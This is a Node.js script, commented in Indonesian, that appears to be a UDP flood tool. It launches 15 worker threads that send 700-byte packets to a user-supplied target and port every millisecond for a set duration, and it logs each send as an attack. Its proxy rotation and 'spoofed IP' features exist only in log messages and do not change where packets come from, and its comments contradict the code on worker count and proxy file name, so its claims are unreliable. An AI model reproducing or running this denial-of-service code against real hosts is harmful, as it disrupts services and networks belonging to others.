const dgram = require('dgram');
const { Worker, isMainThread, workerData } = require('worker_threads');
const fs = require('fs');

const target = process.argv[2];
const port = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]) * 1000;
const workers = 15; // Maksimum 5 worker
const packetSize = 700; // Ukuran paket UDP

// Load proxies dari file proxy.txt
function loadProxies() {
    try {
        return fs.readFileSync('Soks.txt', 'utf-8').split('\n').filter(Boolean);
    } catch (e) {
        console.error("Gagal membaca file ");
        return [];
    }
}

// Fungsi spoof IP address
function spoofIP() {
    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
}

// batasan
function startWorker(proxyList) {
    if (isMainThread) {
        for (let i = 0; i < workers; i++) {
            new Worker(__filename, { workerData: { target, port, duration, proxyList } });
        }
    } else {
        const socket = dgram.createSocket('udp4');
        const startTime = Date.now();
        const packet = Buffer.alloc(packetSize, 'X');

        function sendPacket() {
            if (Date.now() - startTime > workerData.duration) {
                console.log(`Worker selesai menyerang ${workerData.target}`);
                process.exit(0);
            }

            const randomProxy = workerData.proxyList[Math.floor(Math.random() * workerData.proxyList.length)];
            const spoofedIP = spoofIP();

            socket.send(packet, 0, packet.length, workerData.port, workerData.target, (err) => {
                if (!err) {
                    console.log(`Sent packet to ${workerData.target}:${workerData.port} via ${randomProxy} (Spoofed IP: ${spoofedIP})`);
                }
            });

            setTimeout(sendPacket, 1);
        }

        sendPacket();
    }
}



const proxies = loadProxies();
if (proxies.length === 0) {
    console.error("Tidak ada proxy yang tersedia. Masukkan proxy di file proxy.txt");
    process.exit(1);
}

console.log(`🔥 Menyerang ${target}:${port} selama ${duration / 1000} detik dengan ${workers} worker...`);
startWorker(proxies);